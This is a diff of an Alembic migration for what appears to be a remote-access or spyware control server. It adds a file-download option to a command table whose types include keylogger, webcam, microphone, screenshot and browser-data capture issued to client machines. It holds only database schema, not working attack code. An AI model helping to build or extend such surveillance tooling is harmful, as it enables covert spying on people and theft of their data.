@@ -1,15 +1,16 @@
 """Initial migration.
 
-Revision ID: 359dbd8efdb3
+Revision ID: d4fdf10c17d1
 Revises: 
-Create Date: 2024-05-23 09:48:24.296394
+Create Date: 2024-05-28 18:36:38.502546
 
 """
-import sqlalchemy as sa
 from alembic import op
+import sqlalchemy as sa
+
 
 # revision identifiers, used by Alembic.
-revision = '359dbd8efdb3'
+revision = 'd4fdf10c17d1'
 down_revision = None
 branch_labels = None
 depends_on = None
@@ -32,9 +33,7 @@ def upgrade():
     )
     op.create_table('command',
     sa.Column('id', sa.Integer(), nullable=False),
-                    sa.Column('type',
-                              sa.Enum('SCREENSHOT', 'MICROPHONE', 'BROWSER_DATA', 'KEYLOGGER', 'PAPIER', 'WEBCAM',
-                                      name='commandtype'), nullable=False),
+    sa.Column('type', sa.Enum('SCREENSHOT', 'MICROPHONE', 'BROWSER_DATA', 'KEYLOGGER', 'PAPIER', 'WEBCAM', 'DOWNLOAD_FILE', name='commandtype'), nullable=False),
     sa.Column('browser_name', sa.String(length=64), nullable=True),
     sa.Column('client_id', sa.Integer(), nullable=False),
     sa.Column('file_path', sa.String(length=256), nullable=False),
